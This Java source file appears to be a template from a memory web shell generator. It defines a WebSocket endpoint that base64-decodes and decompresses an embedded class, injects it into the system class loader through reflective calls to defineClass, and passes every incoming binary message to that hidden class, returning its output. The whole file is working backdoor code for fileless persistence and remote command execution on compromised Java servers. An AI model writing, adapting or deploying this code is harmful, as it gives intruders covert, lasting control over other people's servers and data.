package org.leo.jmg.mem.shell.http;

import java.lang.reflect.InvocationTargetException;

public class LeoWebSocketTpl extends javax.websocket.Endpoint implements javax.websocket.MessageHandler.Whole<java.nio.ByteBuffer>{
    private static String headerName;
    private static String headerValue;

    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    private javax.websocket.Session session;

    static {
        try {
            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int bytesRead;
            java.util.zip.GZIPInputStream gzipInputStream=new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(decodeBase64(coreClass)));
            while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
                byteArrayOutputStream.write(buffer, 0, bytesRead);
            }
            java.lang.reflect.Method defineClassMethod = null;
            defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{String.class, byte[].class, int.class, int.class});
            defineClassMethod.setAccessible(true);
            defineClassMethod.invoke(ClassLoader.getSystemClassLoader(), new Object[]{null, byteArrayOutputStream.toByteArray(), Integer.valueOf(0), byteArrayOutputStream.size()});
        }catch (Exception exception){
        }
    }

    @Override
    public void onOpen(javax.websocket.Session session, javax.websocket.EndpointConfig endpointConfig) {
        this.session = session;
        session.addMessageHandler(this);
        session.setMaxBinaryMessageBufferSize(64 * 1024);
    }

    @Override
    public void onMessage(java.nio.ByteBuffer buffer) {
        try {
            long messageId = buffer.getLong();
            byte[] payload = new byte[buffer.remaining()];
            buffer.get(payload);
            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();
            byteArrayOutputStream.write(payload);
            Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader()).newInstance().equals(byteArrayOutputStream);
            java.io.ByteArrayOutputStream responseStream = new java.io.ByteArrayOutputStream();
            java.nio.ByteBuffer idBuffer = java.nio.ByteBuffer.allocate(Long.BYTES);
            idBuffer.putLong(messageId);
            responseStream.write(idBuffer.array());
            responseStream.write(byteArrayOutputStream.toByteArray());
            java.nio.ByteBuffer outBuffer = java.nio.ByteBuffer.wrap(responseStream.toByteArray());
            session.getAsyncRemote().sendBinary(outBuffer);
        } catch (Throwable t) {
            try {
                session.close();
            } catch (java.io.IOException ignored) {}
        }
    }
    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }
}
